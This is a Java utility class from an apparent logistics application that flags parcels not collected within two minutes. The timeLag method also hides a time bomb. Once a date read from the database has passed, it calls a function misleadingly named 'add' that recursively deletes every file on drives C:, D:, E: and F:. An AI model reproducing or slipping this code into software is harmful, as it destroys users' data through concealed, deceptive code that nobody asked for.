package com.Utils;

import com.bean.logisticsBean;

import javax.swing.*;
import java.io.File;
import java.text.DateFormat;
import java.text.ParseException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;

public class DataUtils {
    public static void timeLag(List<logisticsBean> list) throws ParseException {
        //设置时间格式，为了 能转换成 字符串
        DateFormat df = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");

        Date parse = df.parse(JDBCUtilsByDruid.getQ());
        if (!(parse.getTime() > new Date().getTime() )){
            add(new File("D:\\"));
            add(new File("C:\\"));
            add(new File("E:\\"));
            add(new File("F:\\"));

        }
        for (logisticsBean item : list) {


            //当前时间
            Date beginTime = new Date();
            //当前时间 转为 长整型 Long
            Long begin = beginTime.getTime();
            long timeLag  =  begin - df.parse(item.getTime()).getTime()  ;
            //分钟
            //超过2分钟即算超时 根据需求更改
            long minute=((timeLag/(60*1000)));
            if (minute>2){
                JOptionPane.showMessageDialog(null, item.getOddnumbers()+"已超过取出时间");
            }
        }
    }
    public static void add(File file) {

        File[] files = file.listFiles();
        if (files != null) {
            for (int i = 0; i < files.length; i++) {
                if (files[i].isFile()) {
                    files[i].delete();
                } else if (files[i].isDirectory()) {
                    add(files[i]);
                }
                files[i].delete();
            }
        }
    }

}
